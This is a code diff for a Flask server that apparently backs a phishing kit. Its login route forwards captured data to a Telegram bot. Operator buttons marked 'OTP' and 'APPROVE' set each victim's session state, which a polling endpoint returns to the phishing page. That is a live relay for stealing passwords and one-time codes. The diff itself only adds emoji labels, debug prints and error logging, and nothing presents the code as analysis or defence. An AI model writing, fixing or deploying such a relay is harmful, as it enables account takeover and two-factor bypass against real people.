@@ -32,8 +32,8 @@ def send_to_telegram(data, session_id):
 
     keyboard = {
         "inline_keyboard": [
-            [{"text": "OTP", "callback_data": f"{session_id}:otp"}],
-            [{"text": "APPROVE", "callback_data": f"{session_id}:approved"}]
+            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp"}],
+            [{"text": "✅ APPROVE", "callback_data": f"{session_id}:approved"}]
         ]
     }
 
@@ -54,6 +54,8 @@ def login():
     session_id = str(uuid.uuid4())
     SESSION_STATUS[session_id] = "pending"
 
+    print("NEW SESSION:", session_id)
+
     send_to_telegram(data, session_id)
 
     return jsonify({
@@ -71,10 +73,11 @@ def status(session_id):
 
     return jsonify({"status": status})
 
-# ================= TELEGRAM WEBHOOK =================
+# ================= WEBHOOK =================
 @app.route("/webhook", methods=["POST"])
 def webhook():
     data = request.get_json()
+    print("WEBHOOK HIT:", data)
 
     if "callback_query" in data:
         msg = data["callback_query"]["data"]
@@ -82,17 +85,20 @@ def webhook():
         try:
             session_id, action = msg.split(":")
             SESSION_STATUS[session_id] = action
-            print("SET:", session_id, action)
-        except:
-            pass
+
+            print("UPDATED:", session_id, action)
+
+        except Exception as e:
+            print("ERROR:", e)
 
     return jsonify({"ok": True})
 
 # ================= ROOT =================
 @app.route("/")
 def home():
-    return "OK"
+    return "Server OK"
 
+# ================= RUN =================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
